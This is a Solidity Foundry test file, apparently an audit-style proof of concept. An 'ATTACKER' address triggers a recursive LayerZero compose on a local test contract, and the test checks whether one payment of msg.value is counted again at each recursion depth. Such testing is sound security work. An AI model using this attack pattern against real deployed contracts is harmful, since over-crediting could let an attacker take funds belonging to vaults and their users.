// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;
import { TestHelperOz5 } from "@layerzerolabs/test-devtools-evm-foundry/contracts/TestHelperOz5.sol";
import { RecursiveComposer } from "../src/RecursiveComposer.sol";
import { ILayerZeroEndpointV2 } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ILayerZeroEndpointV2.sol";
import { console2 } from "forge-std/console2.sol";

contract RealRecursiveComposeValueTest is TestHelperOz5 {
    RecursiveComposer composer;
    uint32 chainEid = 1;
    address ATTACKER = address(0xDEAD);

    function setUp() public override {
        super.setUp();
        setUpEndpoints(1, LibraryType.UltraLightNode);
        composer = new RecursiveComposer(address(endpoints[chainEid]));
        vm.deal(ATTACKER, 10 ether);
    }

    function test_ATTACK_RecursiveComposeValueAccounting_ON_REAL_CODE() public {
        ILayerZeroEndpointV2 endpoint = ILayerZeroEndpointV2(address(endpoints[chainEid]));

        uint256 realValuePaid = 1 ether;
        bytes32 guid = keccak256("recursive-chain-guid-0");
        bytes memory initialMessage = abi.encode(uint16(0));

        console2.log("ATTACKER pays exactly", realValuePaid, "wei ONCE.");
        console2.log("Triggering a self-chaining recursive compose, MAX_DEPTH=4...");

        vm.prank(ATTACKER);
        endpoint.sendCompose(address(composer), guid, 0, initialMessage);

        vm.prank(ATTACKER);
        endpoint.lzCompose{value: realValuePaid}(
            ATTACKER, address(composer), guid, 0, initialMessage, bytes("")
        );

        console2.log("=== GROUND TRUTH ===");
        console2.log("Real value actually paid by attacker (once):", realValuePaid);
        console2.log("Deepest recursion level reached:", composer.deepestLevelReached());
        console2.log("Sum of msg.value OBSERVED across all nested calls:", composer.totalValueObservedAcrossAllDepths());
        console2.log("Total credited to ATTACKER across all depths:", composer.credited(ATTACKER));

        if (composer.totalValueObservedAcrossAllDepths() > realValuePaid) {
            console2.log("!!!!! VALUE DOUBLE-COUNTED: same ether observed as 'new' at multiple recursion depths !!!!!");
            console2.log("!!!!! A vault crediting based on msg.value per-call would over-credit by:",
                composer.totalValueObservedAcrossAllDepths() - realValuePaid);
        } else {
            console2.log("Value accounting is correct - no double-counting across recursion depth.");
        }
    }
}
